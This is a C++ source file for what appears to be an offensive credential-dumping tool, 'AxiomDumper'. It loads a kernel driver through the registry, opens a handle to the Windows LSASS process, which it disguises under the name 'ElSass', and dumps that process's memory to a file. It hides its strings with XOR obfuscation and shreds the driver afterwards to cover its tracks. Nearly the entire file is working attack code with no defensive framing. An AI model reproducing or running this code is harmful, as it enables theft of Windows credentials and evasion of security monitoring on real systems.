#include "AxiomDumper.h"
#include "ElSass.h"
#include "dm.h"
#include "compiletime_md5.hpp"
#include "autoxor.h"
#include "windows.h"
#include <stdio.h>
#include <fstream>

PAXIOM_OPTIONS g_options = NULL;

int main(int argc, char **argv)
{
	DWORD result = 0;
	LUID luid = { 0,0 };
	HANDLE elsassHandle = NULL;
	AXIOM_OPTIONS l_options;
	void* buffer;
	int bufferSize = 0;

	(void)luid;
	(void)elsassHandle;
	(void)buffer;
	(void)bufferSize;
	memset(&l_options, 0, sizeof(AXIOM_OPTIONS));
	g_options = &l_options;
	if (!CORE_parse_args(argc, argv))
	{
		printf("[!] Invalid options\n");
		return (1);
	}

	if (g_options->mode == ModeFindKernelBase)
	{
		printf("[+] Re-run with option: /kernelbase:%llx\n", DM_FindNtoskrnlBaseAddress());
		return (0);
	}

	if (g_options->mode == ModeHelp)
	{
		char ntoskrnl_version_buffer[1024];

		printf(USAGE_STRING, argv[0], argv[0], argv[0]);
		DM_GetKrnlVersion(ntoskrnl_version_buffer, sizeof(ntoskrnl_version_buffer), XorStr("C:\\Windows\\System32\\ntoskrnl.exe"));
		printf("[+] Current ntoskrnl version: %s\n", ntoskrnl_version_buffer);
		return (0);
	}

	if (g_options->mode == ModeUnload)
	{
		DM_PrivIncrease();
		DM_UnloadDriver(g_options->drv_name);
		DM_ShredAndDeleteDriver(g_options->driver, g_options->drv_name);
		return (0);
	}

	CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if (g_options->autoload_mode == AutoloadReflective)
	{
		DM_DropDriverToDisk(g_options->driver, g_options->drv_name);
		NTSTATUS status = DM_AddDriverViaRegistry(g_options->drv_name);
		if (!NT_SUCCESS(status)) {
			DM_ShredAndDeleteDriver(g_options->driver, g_options->drv_name);
			printf("[!] Failed to add registry entry (0x%x)\n", status);
			return (1);
		}
		if (!DM_LoadDriver(g_options->drv_name)) {
			DM_ShredAndDeleteDriver(g_options->driver, g_options->drv_name);
			return (1);
		}
	}

	DM_LoadFramework();
	if (UTILS_PrivCheck())
	{
		printf("[+] Running in admin mode\n");
		elsassHandle = DM_SpawnHandle(ELSASS_FindPid());
		printf("[+] ElSass handle: 0x%p\n", elsassHandle);
		if (!El_Sass(elsassHandle, (const void**)&buffer, &bufferSize)) {
			printf("[!] Failed\n");
			result = 1;
			goto cleanup;
		}
		printf("[+] Memory dumped, got %d bytes\n", bufferSize);
		if (g_options->mode == ModeDropfile)
		{
			std::ofstream _file;
			_file.open(g_options->savepath, std::ios::out | std::ios::binary | std::ios::trunc);
			_file.write((char*)buffer, bufferSize);
			_file.close();
			printf("[+] File saved in %s\n", g_options->savepath);
		}
	}
	else {
		printf("[!] Not enough privileges\n");
		result = 1;
		goto cleanup;
	}

cleanup:
	CloseHandle(g_drv_handle);
	if (g_options->autoload_mode == AutoloadReflective)
	{
		DM_UnloadDriver(g_options->drv_name);
		DM_ShredAndDeleteDriver(g_options->driver, g_options->drv_name);
	}
	return (result);
}

